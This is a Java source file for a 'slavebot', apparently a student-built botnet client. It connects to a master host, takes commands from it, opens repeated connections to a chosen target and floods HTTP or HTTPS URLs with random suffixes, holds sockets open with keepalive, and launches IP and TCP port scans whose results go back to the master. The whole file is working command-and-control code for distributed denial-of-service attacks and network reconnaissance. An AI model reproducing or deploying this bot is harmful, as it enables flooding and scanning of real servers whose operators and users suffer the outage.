package masterslave;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.net.InetAddress;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Random;

public class slavebot extends Thread {

    private String targetname;
    private int targetport;
    private String option;

    public slavebot(String targetname, int targetport, String option) {// ,
        // boolean
        // connection
        this.targetname = targetname;
        this.targetport = targetport;
        this.option = option;
        // this.connection = connection;
    }

    // Specify date format
    static DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd");

    // This list is used for storing slaves information.
    static List<slave> targets = new ArrayList<slave>();

    public static void main(String argv[]) throws Exception {
        // port number and name come from arguments
        int portnum;
        String mastername;
        if (argv.length != 4 || (!(argv[0].equals("-p") && argv[2].equals("-h"))
                && !(argv[0].equals("-h") && argv[2].equals("-p")))) {
            System.out.println(
                    "Correct way: slavebot -p masterport -h masterhost or \n" + "slave -h masterhost -p masterport");
            System.exit(1);
        }
        if (argv[0].equals("-p") && argv[2].equals("-h")) {
            portnum = Integer.parseInt(argv[1]);
            mastername = argv[3];
        } else {
            portnum = Integer.parseInt(argv[3]);
            mastername = argv[1];
        }

        String comM; // command from masterbot

        Socket mastersock = new Socket(mastername, portnum);

        // DataOutputStream outToServer = new
        // DataOutputStream(clientSocket.getOutputStream());
        // outToServer.writeBytes(sentence + '\n');

        // read input form server
        BufferedReader in = new BufferedReader(new InputStreamReader(mastersock.getInputStream()));

        PrintStream pstream = new PrintStream(mastersock.getOutputStream());

        while ((comM = in.readLine()) != null) {
            // if (comM.equals("connection?")) {
            // pstream.println("Waiting for command.");
            // continue;
            // }

            pstream.println("From slave: get command.");

            System.out.println("Get command:\n" + comM);

            // pass comM to command some parser first
            // int n = fun(); socket rsock = ... ; remote socket

            commandParser par = new commandParser(comM);

            int cmdtype = par.getCommandType();

            // connect and disconnect
            if (cmdtype < 4) {
                String tIden = par.getTargetIdentifier();
                String tType = par.getTargetIdentifierType();
                int tport = par.getTargetport();
                String option = par.getOption();
                int n = par.getRepeattimes(); // 0 means disconnect

                // connect to target(s)
                if (cmdtype == 2) {
                    for (int i = 0; i < n; i++) {
                        slavebot child = new slavebot(tIden, tport, option);
                        child.start();
                    }
                    pstream.println("From slave: connection setted.");

                }
                // disconnect to target (one specific port or all ports)
                else if (cmdtype == 3) {
                    int ind = getElementIndex(tIden, tType, tport);
                    while (ind != -1) {
                        terminate(ind);
                        ind = getElementIndex(tIden, tType, tport);
                    }
                    System.out.println("Diconnected.");
                    pstream.println("From slave: disconnection done.");
                }
            }
            // ipscan
            else if (cmdtype == 4) {
                System.out.println("Start ip scanning...");
                pstream.println("From slave: ipscan start...");

                List<Integer> ip1 = par.getIp1();
                List<Integer> ip2 = par.getIp2();
                new Thread(new ipscanner(ip1, ip2, mastersock)).start();

            }
            // tcpportscan
            else if (cmdtype == 5) {
                System.out.println("Start tcpport scanning...");
                pstream.println("From slave: tcpportscan start...");

                String tIden = par.getTargetIdentifier();
                int tport = par.getTargetport();
                int tport2 = par.getTargetport2();

                new Thread(new portscanner(tIden, tport, tport2, mastersock)).start();

            }

        }
        // don't close on purpose
        // mastersock.close();
    }

    public void run() {
        try {
            // Handle random string generate to URL, like url=/q#=abcde
            // A way with URL library. Ref:
            // https://docs.oracle.com/javase/tutorial/networking/urls/creatingUrls.html
            // Another way is to use socket sending HTTP GET request
            if (option != null && option.substring(0, 4).equals("url=")) {
                String myurlstring = "";

                // add protocol prefix
                if (targetport == 80)
                    myurlstring = "http://" + targetname + option.substring(4);
                else if (targetport == 443)
                    myurlstring = "https://" + targetname + option.substring(4);
                else {
                    System.out.println("Wrong protocol (not http or https).");
                    return;
                }

                // add random string postfix at the end of url
                myurlstring += generateString();
                System.out.println("Connect with the URL " + myurlstring);

                // URL object creation
                URL myurl = new URL(myurlstring);
                URLConnection yc = myurl.openConnection();
                BufferedReader in = new BufferedReader(new InputStreamReader(yc.getInputStream()));
                String inputLine;

                // Discard all stuffs returned from server
                while ((inputLine = in.readLine()) != null)
                    ;
                // If we need to print the reply message from server, use
                // System.out.println(inputLine);

                System.out.println("Discard all stuff (html file) from the server.");

                // will close the connection automatically
                in.close();

                System.out.println("Disconnect with " + myurlstring + " automatically.");

                return;
            }

            // Use socket api to handle other command
            // might need to use blocking queue

            // Socket() can handle IP and name
            Socket targetsock = new Socket(targetname, targetport);

            // set keepalive
            if (option != null && option.equals("keepalive")) {
                targetsock.setKeepAlive(true);
                System.out.println("keepalive setted.");
            }

            // time stamp
            String connectiondate = dateFormat.format(new Date());

            // add to the targetlist
            addElement(new slave(targetsock, connectiondate));

            PrintStream pstream = new PrintStream(targetsock.getOutputStream());
            System.out.println("Try to connect " + targetname + " at port " + targetport + " and write some message.");
            pstream.println("test message to target");

        } catch (IOException e) {
            System.out.println(e);
        }
    }

    public void addElement(slave s) {
        synchronized (targets) {
            targets.add(s);
        }
    }

    // Find the first match
    public static int getElementIndex(String identifier, String identifierType, int port) {
        synchronized (targets) {
            // return the fist found one, else return -1
            if (identifierType.equals("IP")) {
                for (int i = 0; i < targets.size(); i++) {
                    if (targets.get(i).getIPaddr().equals(identifier)) {
                        if (port == -1)
                            return i;
                        else if (targets.get(i).getSourcePortNumber() == port)
                            return i;
                    }
                }
            } else {
                for (int i = 0; i < targets.size(); i++) {
                    if (targets.get(i).getName().equals(identifier)) {
                        if (port == -1)
                            return i;
                        else if (targets.get(i).getSourcePortNumber() == port)
                            return i;
                    }
                }
            }
            return -1;
        }
    }

    public static int getSize() {
        synchronized (targets) {
            return targets.size();
        }
    }

    public static void terminate(int index) {
        synchronized (targets) {
            try {
                System.out.println("Try to close the connection with " + targets.get(index).getName());
                targets.get(index).getSock().close();
                targets.remove(index);
                System.out.println("Close succeed!");
            } catch (Exception e) {
                System.out.println("Failed close connection with " + targets.get(index).getName());
            }
        }
    }

    public static String generateString() {
        Random r = new Random();
        String source = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        int len = r.nextInt(10) + 1;
        char[] text = new char[len];
        for (int i = 0; i < len; i++) {
            text[i] = source.charAt(r.nextInt(source.length()));
        }
        return new String(text);
    }

}
